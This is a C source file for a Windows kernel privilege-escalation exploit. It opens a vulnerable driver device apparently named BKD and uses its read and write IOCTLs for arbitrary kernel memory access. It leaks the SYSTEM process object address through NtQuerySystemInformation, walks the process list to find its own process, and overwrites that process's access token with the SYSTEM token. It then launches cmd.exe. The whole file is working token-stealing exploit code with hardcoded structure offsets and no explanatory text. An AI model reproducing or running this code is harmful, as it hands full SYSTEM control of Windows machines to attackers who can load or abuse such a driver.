#include <Windows.h>
#include <psapi.h>
#include <winioctl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#define WRITE_IOCTL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define READ_IOCTL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define UniqueProcessId_off    0x440
#define ActiveProcessLinks_off 0x448
#define Token_off              0x4b8


typedef struct
{
    PVOID addr;          
    unsigned long long value;  
} BkdPl;


uint64_t arbitrary_read(HANDLE hBKD, PVOID addr){

    BkdPl in = {0};
    BkdPl out = {0};
    
    in.addr = addr;

    DeviceIoControl(hBKD, READ_IOCTL, &in, sizeof(in), &out, sizeof(out), NULL, (LPOVERLAPPED)NULL);

    return (uint64_t)out.value;
}

VOID arbitrary_write(HANDLE hBKD, unsigned long long val, PVOID addr){

    BkdPl in = {0};
    in.value = (uintptr_t)val;

    in.addr  = addr;

    DeviceIoControl(hBKD, WRITE_IOCTL, &in, sizeof(in), &in, sizeof(in), NULL, (LPOVERLAPPED)NULL);

}

typedef struct _SYSTEM_HANDLE {
    ULONG       ProcessId;        
    BYTE        ObjectTypeNumber;
    BYTE        Flags;            
    USHORT      Handle;              
    PVOID       Object;          
    ACCESS_MASK GrantedAccess;    
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG HandleCount;            
    SYSTEM_HANDLE Handles[1];    
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemHandleInformation = 16,
    SystemObjectInformation = 17,
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

NTSTATUS NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

// Here hehe 
PVOID FindBaseAddress(DWORD pid) {

    HINSTANCE hNtDLL = LoadLibraryA("ntdll.dll");
    PSYSTEM_HANDLE_INFORMATION buffer;
    ULONG bufferSize = 0xffffff;
    buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(bufferSize);
    NTSTATUS status;
    PVOID ProcAddress = NULL;

    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)(GetProcAddress(hNtDLL, "NtQuerySystemInformation"));

    status = NtQuerySystemInformation(0x10, buffer, bufferSize, NULL);

    for (ULONG i = 0; i <= buffer->HandleCount; i++) {
        if ((buffer->Handles[i].ProcessId == pid)) {
            ProcAddress = buffer->Handles[i].Object;
            break;
        }
    }

    free(buffer);
    return ProcAddress;
}

PVOID LocateCurrentProc(HANDLE hBKD, PVOID SYSTEM) {

    DWORD pid = GetCurrentProcessId();
    DWORD curPid;
    PVOID current = SYSTEM;

    do {

        // Follow the next process link
        current = (PVOID)(arbitrary_read(hBKD, (PVOID)((uint64_t)current + ActiveProcessLinks_off)) - ActiveProcessLinks_off);

        // Read the PID of 'current'
        curPid = (DWORD)arbitrary_read(hBKD, (PVOID)((uint64_t)current + UniqueProcessId_off));

        if (curPid == pid) {
            break;
        }

    } while (current != SYSTEM);
    
	  if (current == SYSTEM) {
        return NULL;}

    return current;

}


int main(){

HANDLE hBKD = CreateFileW(L"\\\\.\\BKD", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
printf("+ Vulnerable driver handle: %p\n", hBKD);

PVOID system_proc_base_addr  = FindBaseAddress(4);
PVOID current_proc_base_addr = LocateCurrentProc(hBKD, system_proc_base_addr);

printf("+ System process base address : %p\n", system_proc_base_addr);
printf("+ Current process base address: %p\n", current_proc_base_addr);

PVOID system_proc_token_addr  =  system_proc_base_addr + Token_off;
PVOID current_proc_token_addr =  current_proc_base_addr + Token_off;

printf("* system token address:  %p\n", system_proc_token_addr);
printf("* current token address: %p\n", current_proc_token_addr);

uint64_t system_token = arbitrary_read(hBKD, system_proc_token_addr);
arbitrary_write(hBKD, (uint64_t)system_token, current_proc_token_addr);

printf("+ Overwritten current process token with system token\n");

system("pause");
system("start cmd.exe");
}